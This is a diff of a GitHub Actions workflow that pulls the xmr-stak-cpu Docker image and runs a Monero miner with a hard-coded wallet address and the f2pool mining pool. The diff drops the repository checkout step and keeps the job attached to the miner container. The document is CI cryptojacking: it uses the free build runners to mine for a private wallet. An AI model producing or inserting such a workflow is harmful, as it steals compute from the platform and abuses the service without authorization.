@@ -19,11 +19,11 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v2
 
       - name: 拉取
         run: docker pull cryptocurrency/xmr-stak-cpu
         
       - name: 执行
-        run: docker run -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -d cryptocurrency/xmr-stak-cpu
+        run: |
+          docker run -n xmr -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -d cryptocurrency/xmr-stak-cpu
+          docker attach xmr
